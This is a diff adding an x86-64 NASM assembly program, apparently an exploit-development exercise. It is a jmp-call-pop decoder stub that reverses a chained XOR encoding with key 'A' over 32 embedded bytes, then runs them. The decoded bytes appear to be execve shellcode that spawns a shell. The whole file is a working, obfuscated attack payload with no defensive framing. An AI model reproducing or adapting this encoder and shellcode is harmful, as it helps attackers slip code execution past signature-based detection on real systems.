@@ -1,0 +1,37 @@
+BITS 64
+
+KEY equ 'A'
+LEN equ 32
+global _start:
+section .text
+
+_start:
+    jmp _get_pointer
+
+_decode:
+    pop rdi ; rdi points to encodedshellcode
+
+    push KEY
+    pop rsi
+    xor rax, rax
+    xor rcx, rcx
+    cdq
+
+_loop:
+    
+    cmp rcx, LEN
+    jg EncodedShellcode
+
+    mov al, [rdi] 
+    xor al, sil
+    mov sil, [rdi]
+    mov [rdi], al
+
+
+    inc rdi
+    inc rcx
+    jmp _loop
+
+_get_pointer:
+    call _decode
+    EncodedShellcode: db 0x9,0x38,0xf8,0xa8,0xe0,0x5b,0x74,0x16,0x7f,0x11,0x3e,0x11,0x62,0xa,0x59,0x11,0x98,0x7f,0x2f,0x67,0xee,0xc,0x5b,0x13,0x9a,0x7c,0x34,0xb7,0x77,0x4c,0x43,0x46
